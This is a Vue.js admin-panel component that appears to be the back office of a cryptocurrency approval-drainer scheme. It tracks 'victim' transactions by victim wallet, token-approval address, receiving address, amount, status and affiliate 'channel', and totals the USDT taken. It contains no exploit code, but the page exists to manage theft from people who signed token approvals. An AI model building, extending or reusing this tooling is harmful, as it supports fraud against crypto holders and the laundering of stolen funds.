<template>
  <div>
    <div class="gva-search-box">
      <el-form ref="searchForm" :inline="true" :model="searchInfo">
        <el-form-item label="一级渠道">
          <el-select v-model="searchInfo.channel" clearable placeholder="请选择">
            <el-option
                v-for="item in channelList"
                :key="item.userName"
                :label="`${item.userName}`"
                :value="item.userName"
            />
          </el-select>
        </el-form-item>
        <el-form-item label="用户地址">
          <el-input v-model="searchInfo.fromAddress" placeholder="" />
        </el-form-item>
        <!--        <el-form-item label="地址">-->
        <!--          <el-input v-model="searchInfo.apiGroup" placeholder="" />-->
        <!--        </el-form-item>-->
        <el-form-item label="状态">
          <el-select v-model="searchInfo.status" clearable placeholder="请选择">
            <el-option
                v-for="item in stateOptions"
                :key="item.value"
                :label="`${item.text}`"
                :value="item.value"
            />
          </el-select>
        </el-form-item>
        <el-form-item align="left" label="开始日期" width="180">
          <el-input v-model="searchInfo.startDate" type="date" placeholder="请选择开始日期" />
        </el-form-item>
        <el-form-item align="left" label="结束日期" width="180">
          <el-input v-model="searchInfo.endDate" type="date" placeholder="请选择开始日期" />
        </el-form-item>
        <el-form-item>
          <el-button type="primary" icon="search" @click="onSubmit">查询</el-button>
          <el-button icon="refresh" @click="onReset">重置</el-button>
        </el-form-item>
      </el-form>
    </div>
    <div class="statebox">
      <div class="stateitem">
        <div>申请中</div>
        <div>{{init}}笔</div>
        <div>{{initAmount}}USDT</div>
      </div>
      <div class="stateitem">
        <div>交易中</div>
        <div>{{pending}}笔</div>
        <div>{{pendingAmount}}USDT</div>
      </div>
      <div class="stateitem">
        <div>成功</div>
        <div>{{success}}笔</div>
        <div>{{successAmount}}USDT</div>
      </div>
      <div class="stateitem">
        <div>失败</div>
        <div>{{failure}}笔</div>
        <div>{{failureAmount}}USDT</div>
      </div>
    </div>
    <div class="gva-table-box">
      <div class="gva-btn-list">
        <!--        <el-button type="primary" icon="plus" @click="openDialog('addApi')">新增</el-button>-->
      </div>
      <el-table :data="tableData" @sort-change="sortChange" @selection-change="handleSelectionChange">
        <el-table-column
            type="selection"
            width="55"
        />
        <el-table-column align="left" label="id" min-width="60" prop="ID" sortable="custom" />
        <el-table-column align="left" label="用户地址" min-width="150" prop="fromAddress" sortable="custom" >
        <!-- <el-table-column align="left" label="网络" min-width="80" prop="network" sortable="custom" /> -->

        <template #default="scope">
          <a :href="'https://etherscan.io/address/'+scope.row.fromAddress"  target="_blank" >{{scope.row.fromAddress}}</a>
        </template>
        </el-table-column>


        <el-table-column align="left" label="金额" min-width="80" prop="withdrawAmount" sortable="custom" />
        <el-table-column align="center" label="状态" min-width="180"  sortable="custom" >
          <template #default="scope" >
				   <span :class="'state'+scope.row.status">{{
               stateOptions[scope.row.status].text
             }}</span> <br><el-button
              icon="refresh"

              type="primary"
              link
              @click="GetVictimdata(scope.row)"
          >刷新状态</el-button>
          </template>

        </el-table-column>
        <el-table-column align="left" label="币种" min-width="80" prop="token" sortable="custom" />
        <el-table-column align="left" label="授权地址" min-width="150" prop="approvalAddress" sortable="custom" >
          <template #default="scope">
            <a :href="'https://etherscan.io/address/'+scope.row.approvalAddress"  target="_blank" >{{scope.row.approvalAddress}}</a>
          </template>
        </el-table-column>

        <el-table-column align="left" label="到账地址" min-width="150" prop="toAddress" sortable="custom" >
          <template #default="scope">
            <a :href="'https://etherscan.io/address/'+scope.row.toAddress"  target="_blank" >{{scope.row.toAddress}}</a>
          </template>
        </el-table-column>
        <el-table-column align="left" label="交易hash" min-width="150" prop="txHash" sortable="custom" >

          <template #default="scope">
            <a :href="'https://etherscan.io/tx/'+scope.row.txHash"  target="_blank" >{{scope.row.txHash}}</a>
          </template>

        </el-table-column>
        <el-table-column align="left" label="刷新次数" min-width="100" prop="refresh" sortable="custom"/>
        <el-table-column align="left" label="备注" min-width="100" prop="desc" sortable="custom"/>
        <el-table-column align="left" label="二级渠道" min-width="100" prop="secondaryChannel" sortable="custom"/>
        <el-table-column align="left" label="一级渠道" min-width="100" prop="primaryChannel" sortable="custom"/>

        <el-table-column align="left" label="提交日期" min-width="150"  sortable="custom" >
          <template #default="scope">{{
              formatDate(scope.row.CreatedAt)
            }}

          </template>
        </el-table-column>
        <!-- <el-table-column align="left" label="已提取" min-width="100" prop="withdrawAmount" sortable="custom" > -->
        <!-- <el-table-column align="left" label="备注" min-width="150" prop="desc" sortable="custom" /> -->

        <!--        <el-table-column align="left" label="二级渠道" min-width="150" prop="secondaryChannel" sortable="custom" >-->
        <!--&lt;!&ndash;        <el-table-column align="left" label="一级渠道" min-width="150" prop="description" sortable="custom" />&ndash;&gt;-->

        <!--          <template #default="scope">-->
        <!--            <div>-->
        <!--              {{ scope.row.method }} / {{ methodFilter(scope.row.method) }}-->
        <!--            </div>-->
        <!--          </template>-->
        <!-- </el-table-column> -->


        <el-table-column align="left" fixed="right" label="操作" width="100">
          <template #default="scope">
            <!-- <el-button
                 icon="edit"

                 type="primary"
                 link
                 @click="editApiFunc(scope.row)"
             >编辑</el-button> -->
            <el-button
                icon="refresh"

                type="primary"
                link
                @click="GetVictimdata(scope.row)"
            >刷新</el-button>

            <!--  <el-button
                  icon="edit"

                  type="primary"
                  link
                  @click="editApiFunc(scope.row)"
              >提现</el-button> -->

          </template>
        </el-table-column>

      </el-table>
      <div class="gva-pagination">
        <el-pagination
            :current-page="page"
            :page-size="pageSize"
            :page-sizes="[10, 30, 50, 100]"
            :total="total"
            layout="total, sizes, prev, pager, next, jumper"
            @current-change="handleCurrentChange"
            @size-change="handleSizeChange"
        />
      </div>

    </div>

    <el-dialog v-model="dialogFormVisible" :before-close="closeDialog" :title="dialogTitle">
      <!--      <warning-bar title="新增API，需要在角色管理内配置权限才可使用" />-->
      <el-form ref="apiForm" :model="form" :rules="rules" label-width="80px">
        <el-form-item label="用户地址" prop="customerAddress">
          <el-input v-model="form.customerAddress" autocomplete="off" />
        </el-form-item>
        <el-form-item label="授权地址" prop="approvalAddress">
          <el-input v-model="form.approvalAddress" autocomplete="off" />
        </el-form-item>

        <!--        <el-form-item label="地址类型" prop="network">-->
        <!--          <el-input v-model="form.network" autocomplete="off" />-->
        <!--        </el-form-item>-->

        <el-form-item label="地址类型">
          <el-select v-model="form.network" clearable placeholder="请选择">
            <el-option
                v-for="item in networkOptions"
                :key="item.value"
                :label="`${item.label}(${item.value})`"
                :value="item.value"
            />
          </el-select>
        </el-form-item>

        <el-form-item label="币种类型">
          <el-select v-model="form.token" clearable placeholder="请选择">
            <el-option
                v-for="item in tokenOptions"
                :key="item.value"
                :label="`${item.label}(${item.value})`"
                :value="item.value"
            />
          </el-select>
        </el-form-item>

        <!--        <el-form-item label="" prop="token">-->
        <!--          <el-input v-model="form.token" autocomplete="off" />-->
        <!--        </el-form-item>-->


        <el-form-item label="备注信息" prop="desc">
          <el-input v-model="form.desc" autocomplete="off" />
        </el-form-item>

      </el-form>
      <template #footer>
        <div class="dialog-footer">
          <el-button @click="closeDialog">取 消</el-button>
          <el-button type="primary" @click="enterDialog">确 定</el-button>
        </div>
      </template>
    </el-dialog>
  </div>
</template>

<script>
export default {
  name: 'Api',
}
</script>

<script setup>
import {
  getApiById,
  getApiList,
  createApi,
  updateApi,
  deleteApi,
  deleteApisByIds,
  freshCasbin,
  getVictimTxList,
  statVictimTx,
  GetVictimById,
  getUserList
} from '@/api/collection'
import { toSQLLine } from '@/utils/stringFun'
import WarningBar from '@/components/warningBar/warningBar.vue'
import { ref } from 'vue'
import { ElMessage, ElMessageBox } from 'element-plus'
import {QuestionFilled, VideoCameraFilled} from "@element-plus/icons-vue";
import { formatBoolean, formatDate } from '@/utils/format'
import { toDoc } from '@/utils/doc'

const methodFilter = (value) => {
  const target = methodOptions.value.filter(item => item.value === value)[0]
  return target && `${target.label}`
}

const apis = ref([])
const form = ref({
  path: '',
  apiGroup: '',
  method: '',
  description: ''
})
const stateOptions=ref([
  {value:0,text:'申请中'},
  {value:1,text:'交易中'},
  {value:2,text:'成功'},
  {value:3,text:'失败'}
])
const tokenOptions = ref([
  {
    value: 'USDT',
    label: 'USDT',
    type: 'success'
  },
  {
    value: 'USDC',
    label: 'USDC',
    type: ''
  }
])

const networkOptions = ref([
  {
    value: 'ETH',
    label: '以太坊',
    type: 'success'
  },
  {
    value: 'TRX',
    label: '波场',
    type: 'warning'
  }
])

const type = ref('')
const rules = ref({
  path: [{ required: true, message: '请输入api路径', trigger: 'blur' }],
  apiGroup: [
    { required: true, message: '请输入组名称', trigger: 'blur' }
  ],
  method: [
    { required: true, message: '请选择请求方式', trigger: 'blur' }
  ],
  description: [
    { required: true, message: '请输入api介绍', trigger: 'blur' }
  ]
})

const page = ref(1)
const total = ref(0)
const pageSize = ref(10)
const tableData = ref([])
const searchInfo = ref({})

const onReset = () => {
  searchInfo.value = {}
}
// 搜索

const onSubmit = () => {
  page.value = 1
  pageSize.value = 10
  getTableData()
  getStateData()
}

// 分页
const handleSizeChange = (val) => {
  pageSize.value = val
  getTableData()
}

const handleCurrentChange = (val) => {
  page.value = val
  getTableData()
}

// 排序
const sortChange = ({ prop, order }) => {
  if (prop) {
    if (prop === 'ID') {
      prop = 'id'
    }
    searchInfo.value.orderKey = toSQLLine(prop)
    searchInfo.value.desc = order === 'descending'
  }
  getTableData()
}
//刷新状态
const GetVictimdata=async(row) => {
  const res =await GetVictimById({id:row.ID,refresh:row.refresh,txHash:row.txHash})
  console.log(res)
  if(res.code==7)
  {
    row.status=3
    row.refresh++
  }else if(res.code==0)
  {
    row.status=2
    row.refresh++
  }


}
// 查询
const getTableData = async() => {
  const table = await getVictimTxList({ page: page.value, pageSize: pageSize.value, ...searchInfo.value })
  if (table.code === 0) {
    tableData.value = table.data.list
    total.value = table.data.total
    page.value = table.data.page
    pageSize.value = table.data.pageSize
  }
}
const failure=ref(0)
const init=ref(0)
const pending=ref(0)
const success=ref(0)
const failureAmount=ref(0)
const initAmount=ref(0)
const pendingAmount=ref(0)
const successAmount=ref(0)
const getStateData=async()=>{
  const result = await statVictimTx(searchInfo.value)
  failure.value=result.data.statList.failure
  init.value=result.data.statList.init
  pending.value=result.data.statList.pending
  success.value=result.data.statList.success
  failureAmount.value=result.data.amountList.failure
  initAmount.value=result.data.amountList.init
  pendingAmount.value=result.data.amountList.pending
  successAmount.value=result.data.amountList.success
}
const channelList=ref([])
const getchannelList=async()=>{
  const result = await getUserList()
  for(var i=0;i<result.data.users.length;i++)
  {
    channelList.value.push({id:result.data.users[i].id,userName:result.data.users[i].userName})
  }
}
getchannelList()
getTableData()
getStateData()

// 批量操作
const handleSelectionChange = (val) => {
  apis.value = val
}

const deleteVisible = ref(false)
const onDelete = async() => {
  const ids = apis.value.map(item => item.ID)
  const res = await deleteApisByIds({ ids })
  if (res.code === 0) {
    ElMessage({
      type: 'success',
      message: res.msg
    })
    if (tableData.value.length === ids.length && page.value > 1) {
      page.value--
    }
    deleteVisible.value = false
    getTableData()
  }
}
const freshVisible = ref(false)
const onFresh = async() => {
  const res = await freshCasbin()
  if (res.code === 0) {
    ElMessage({
      type: 'success',
      message: res.msg
    })
  }
  freshVisible.value = false
}

// 弹窗相关
const apiForm = ref(null)
const initForm = () => {
  apiForm.value.resetFields()
  form.value = {
    path: '',
    apiGroup: '',
    method: '',
    description: ''
  }
}

const dialogTitle = ref('新增用户')
const dialogFormVisible = ref(false)
const openDialog = (key) => {
  switch (key) {
    case 'addApi':
      dialogTitle.value = '新增用户'
      break
    case 'edit':
      dialogTitle.value = '编辑用户'
      break
    default:
      break
  }
  type.value = key
  dialogFormVisible.value = true
}
const closeDialog = () => {
  initForm()
  dialogFormVisible.value = false
}

const editApiFunc = async(row) => {
  const res = await getApiById({ id: row.ID })
  form.value = res.data.api
  openDialog('edit')
}

const enterDialog = async() => {
  apiForm.value.validate(async valid => {
    if (valid) {
      switch (type.value) {
        case 'addApi':
        {
          const res = await createApi(form.value)
          if (res.code === 0) {
            ElMessage({
              type: 'success',
              message: '添加成功',
              showClose: true
            })
          }
          getTableData()
          closeDialog()
        }

          break
        case 'edit':
        {
          const res = await updateApi(form.value)
          if (res.code === 0) {
            ElMessage({
              type: 'success',
              message: '编辑成功',
              showClose: true
            })
          }
          getTableData()
          closeDialog()
        }
          break
        default:
          // eslint-disable-next-line no-lone-blocks
        {
          ElMessage({
            type: 'error',
            message: '未知操作',
            showClose: true
          })
        }
          break
      }
    }
  })
}

const deleteApiFunc = async(row) => {
  ElMessageBox.confirm('此操作将永久删除所有角色下该api, 是否继续?', '提示', {
    confirmButtonText: '确定',
    cancelButtonText: '取消',
    type: 'warning'
  })
      .then(async() => {
        const res = await deleteApi(row)
        if (res.code === 0) {
          ElMessage({
            type: 'success',
            message: '删除成功!'
          })
          if (tableData.value.length === 1 && page.value > 1) {
            page.value--
          }
          getTableData()
        }
      })
}

</script>

<style scoped lang="scss">
.warning {
  color: #dc143c;
}
.statebox{
  width:100%;

}
.stateitem{
  background: #d0dbdd;
  margin: 10px 1%;
  padding: 10px 0;
  width: 20%;
  text-align: center;
  float: left;
  color: #4d4d4d;
  border-radius: 5px;
}
.state0{
  background: #2163c5;
  padding: 5px 10px;
  border-radius: 5px;
  color:#fff;
}
.state1{
  background: #8f9089;
  padding: 5px 10px;
  border-radius: 5px;
  color:#fff;
}
.state2{
  background: #1b9f14;
  padding: 5px 10px;
  border-radius: 5px;
  color:#fff;
}
.state3{
  background: #cc1a1a;
  padding: 5px 10px;
  border-radius: 5px;
  color:#fff;
}
</style>
